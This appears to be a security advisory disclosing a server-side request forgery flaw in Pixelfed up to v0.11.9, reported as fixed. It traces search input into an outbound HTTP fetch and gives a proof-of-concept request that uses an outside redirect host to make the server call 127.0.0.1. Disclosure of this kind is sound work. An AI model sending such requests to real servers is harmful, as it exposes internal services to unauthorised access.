### Pixelfed <= v0.11.9 SSRF

Pixelfed <= v0.11.9 is vulnerable to SSRF

Source: `Illuminate\Http\Request::input`

Sink: `Illuminate\Http\Client\PendingRequest::get`

Code:

app/Http/Controllers/SearchController.php

```
public function searchAPI(Request $request) {
	...
	$this->term = $request->input('q');
	...
	$this->getPosts();
}

protected function getPosts() {
	$tag = $this->term;
	$remote = Helpers::fetchFromUrl($tag);
}
```

app/Util/ActivityPub/Helpers.php

```
public static function fetchFromUrl($url = false) {
	$res = ActivityPubFetchService::get($url);
}
```

app/Services/ActivityPubFetchService.php

```
public static function get($url, $validateUrl = true) {
	$res = Http::withHeaders($headers)->timeout(30)->connectTimeout(5)->retry(3, 500)->get($url);
}
```

POC:

1. Listen on 8080 on server side
2. Send a get request to /api/search, with parameters`url=https%3A%2F%2Fssrf.localdomain1234.pw%2Fimg-without-body%2F301-http-127.0.0.1%3A8080-.i.jpg&q=abc&src=metro&v=2&scope=all`
3. Receive a request on server side. 

Status: Fixed, CVE requested